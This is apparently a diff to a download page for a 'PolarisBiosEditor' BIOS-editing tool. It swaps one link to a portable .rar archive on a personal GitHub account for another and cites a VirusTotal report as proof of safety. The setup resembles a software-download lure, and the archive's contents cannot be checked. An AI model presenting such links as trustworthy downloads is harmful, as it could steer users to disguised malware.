@@ -1,7 +1,9 @@
 # PolarisBiosEditor (PBE 1.6.7, 1.7.0, 1.7.6, 3 PRO): Download for Windows/Linux/MacOS
 
-[Download Polaris Bios Editor for Windows/Linux/MacOS](https://github.com/Gujjargit/PolarisBiosEditor/releases/download/PBE176/PolarisBiosEditor-portable.rar)
+
+- [ ]  [Download PolarisBiosEditor 1.7.6-1.6.7](https://github.com/Gujjargit/Gujjargit/releases/download/pbeportable/PolarisBiosEditor-portable.rar)
 -----------------------------------------------------------------------------------------------------------------
+
 ![image](https://user-images.githubusercontent.com/98729987/212367484-718fe836-2feb-44a9-80fe-57efe1fb668b.png)
 -----------------------------------------------------------------------------------------------------------------
 VirusTotal Report: https://www.virustotal.com/de/file/da96cd604093c686e8b1488726ae10a43a550aea5aaba0c0f308183b86f340f3/analysis/1505395469/
